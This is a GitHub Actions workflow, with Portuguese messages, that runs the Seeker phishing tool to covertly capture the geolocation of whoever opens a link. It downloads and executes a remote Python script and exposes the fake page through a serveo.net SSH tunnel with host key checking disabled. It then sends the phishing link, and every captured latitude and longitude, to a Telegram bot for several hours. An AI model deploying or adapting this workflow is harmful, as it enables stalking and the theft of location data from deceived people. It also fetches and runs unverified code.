name: GH-KALI Seeker
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  seek:
    runs-on: ubuntu-latest
    steps:
      - name: Seeker + tunel + relay pro Telegram
        env:
          TG_TOKEN: "${{ secrets.TELEGRAM_TOKEN }}"
          TG_CHAT: "${{ secrets.TELEGRAM_CHAT_ID }}"
        run: |
          pip3 install -q requests psutil --break-system-packages
          rm -rf /opt/seeker && git clone -q --depth 1 https://github.com/thewhiteh4t/seeker /opt/seeker
          curl -sL -o /tmp/fix.py https://raw.githubusercontent.com/datacfgx/sino-grid/main/tools/seeker-py314-fix.py && python3 /tmp/fix.py
          (echo 0 | python3 /opt/seeker/seeker.py -p 8080 > /tmp/seeker.log 2>&1 &)
          sleep 4
          ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 -N -R 80:localhost:8080 serveo.net > /tmp/serveo.out 2>&1 &
          for i in $(seq 1 18); do sleep 5; grep -q Forwarding /tmp/serveo.out && break; done
          URL=$(grep -oE 'https://[a-zA-Z0-9./_-]+' /tmp/serveo.out | head -1)
          echo "URL=$URL"
          MSG=$(printf "SEEKER NO AR\nlink pra mandar:\n%s\n(quem abrir precisa permitir localizacao no navegador)" "$URL")
          curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG}" || true
          ULT=0
          for i in $(seq 1 290); do
            sleep 60
            N=$(grep -c Latitude /tmp/seeker.log 2>/dev/null) || N=0
            if [ "$N" -gt "$ULT" ]; then
              BLOCO=$(grep -iA6 Latitude /tmp/seeker.log | tail -12)
              MSG2=$(printf "LOCALIZACAO PEGA (#%s):\n%s" "$N" "$BLOCO")
              curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" -d chat_id="${TG_CHAT}" --data-urlencode "text=${MSG2}" || true
              ULT=$N
            fi
            echo "ciclo $i capturas=$N"
          done
